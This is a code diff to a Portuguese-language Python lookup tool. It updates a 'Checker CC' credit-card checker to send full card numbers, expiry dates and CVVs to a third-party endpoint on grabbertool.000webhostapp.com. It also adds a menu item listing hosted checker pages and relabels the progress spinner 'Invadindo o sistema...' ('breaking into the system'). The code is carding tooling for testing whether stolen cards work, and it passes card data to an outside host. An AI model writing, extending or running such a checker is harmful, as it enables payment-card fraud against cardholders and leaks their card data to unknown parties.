@@ -71,7 +71,8 @@ def menu():
         4 ⇁ Consulta Placa {Fore.LIGHTRED_EX}[OFF]{Fore.LIGHTWHITE_EX}
         5 ⇁ Consulta Bin
         6 ⇁ Consulta Numero {Fore.LIGHTRED_EX}[OFF]{Fore.LIGHTWHITE_EX}
-        7 ⇁ Checker CC {Fore.LIGHTRED_EX} [OFF]
+        7 ⇁ Checker CC {Fore.LIGHTRED_EX} [OFF]{Fore.LIGHTWHITE_EX}
+        10 ⇁ Site Oficial
         {Fore.LIGHTRED_EX}0 - Fechar{Fore.LIGHTWHITE_EX}
         ''')
     inputt = input('⇨ ')
@@ -100,6 +101,9 @@ def menu():
     if inputt == '7' or inputt == '07':
         print('')
         checkercc()
+    if inputt == '10':
+        os.system('cls')
+        site()
     if inputt == '0' or inputt == '00':
         os.system('cls')
         exit()
@@ -236,11 +240,20 @@ def checkercc():
     print()
     print('Formato checker ( NumeroCC|Mes|Ano|CCV )')
     cc = input('Digite sua CC: ')
-    resultado = requests.get(f'https://laganty.ml/.rest/chknet.php?cc={cc}').text
+    resultado = requests.get(f'https://grabbertool.000webhostapp.com/Checker-api/?cartaum={cc}').text
     Spinnercc()
     print('\n',resultado)
-    print('Em 5 Segundos voce voltara ao menu!')
-    time.sleep(5.0)
+    print('Em 10 Segundos voce voltara ao menu!')
+    time.sleep(10.0)
+    os.system('cls')
+    menu()
+def site():
+    print('ok!')
+    print('https://grabbertool.000webhostapp.com/checker/')
+    print('https://grabbertool.000webhostapp.com/Checker-V2/')
+    print('https://grabbertool.000webhostapp.com/Checker-api/?cartaum=Coloque|a|cc|aki')
+    print('Em 10 Segundos voce voltara ao menu!')
+    time.sleep(10.0)
     os.system('cls')
     menu()
 def error404():
@@ -257,7 +270,6 @@ def Spinnerinicio():
 	for i in l+l+l:
 		sys.stdout.write('\r''[*] Iniciando | Aguarde' +i)
 		sys.stdout.flush()
-		time.sleep(0.3)
 def Spinner():
 	l = ['|', '/', '-', '\\']
 	for i in l+l+l:
@@ -267,7 +279,7 @@ def Spinner():
 def Spinnercc():
 	l = ['|', '/', '-', '\\']
 	for i in l+l+l:
-		sys.stdout.write('\r''[*] Analizando...'+i)
+		sys.stdout.write('\r''[*] Invadindo o sistema...'+i)
 		sys.stdout.flush()
 		time.sleep(0.3)
 # Iniciar menu...
